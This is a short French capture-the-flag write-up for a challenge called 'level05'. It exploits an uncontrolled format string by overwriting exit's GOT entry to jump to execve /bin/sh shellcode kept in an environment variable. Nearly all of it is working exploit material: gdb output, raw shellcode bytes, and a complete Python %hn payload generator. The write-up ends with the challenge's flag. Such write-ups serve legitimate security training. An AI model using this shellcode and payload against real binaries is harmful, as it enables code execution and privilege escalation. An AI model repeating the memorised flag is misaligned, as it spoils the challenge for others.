1. On a un cas d'`Uncontrolled format string`, on va override la GOT pour pointer sur notre shellcode au lieu de la fonction exit.

   ```
   (gdb) b main
   (gdb) r

   (gdb) info functions exit
     0x08048370  exit

   (gdb) disas 0x08048370
     0x08048370 <+0>:	jmp    *0x80497e0

   $ ./level05
   %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
   [...] 25207825 [...]
   # 10e
   ```
2. On va utiliser une variable d'environnement pour stocker le shellcode afin d'eviter son alteration par le `to_lowercase`.
   ```
   export SHELLCODE=`python -c 'print "\x90" * 128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"`

   gcc -m32 /tmp/addr.c -o /tmp/addr

   /tmp/addr
   0xffffd862
   ```

```
(python -c '''

import struct

exit_1 = struct.pack("I", 0x080497e0)
exit_2 = struct.pack("I", 0x080497e0 + 2)
sc_adr = int(raw_input(''), 16)
t = [0xffff & sc_adr, (0xffff0000 & sc_adr) >> 16]
a1 = min(t)
a2 = max(t)

exp = exit_1 + exit_2

p = lambda x: "%%%sx" % x

ret = exp + p(a1 - len(exp)) + "%1" + str(t.index(a1)) + "$hn" + p(a2 - a1) + "%1" + str(t.index(a2)) + "$hn"

exit(1) if any([i > 64 and i < 91 for i in ret]) else 1

print ret
'''; cat;) | ./level05
```

> Flag: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
